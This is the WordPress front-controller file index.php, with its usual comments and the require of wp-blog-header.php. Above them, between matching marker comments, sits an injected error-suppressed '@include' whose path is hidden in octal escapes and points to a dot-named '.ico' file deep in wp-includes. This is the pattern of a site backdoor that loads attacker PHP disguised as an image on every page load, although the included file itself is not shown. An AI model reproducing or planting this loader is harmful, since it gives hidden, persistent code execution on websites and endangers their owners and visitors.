<?php
/*7cae1*/

@include "\104:/\127EB\057RI\111NG\116ET\057wp\055in\143lu\144es\057js\057im\147ar\145as\145le\143t/\05619\06263\0620f\056ic\157";

/*7cae1*/

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
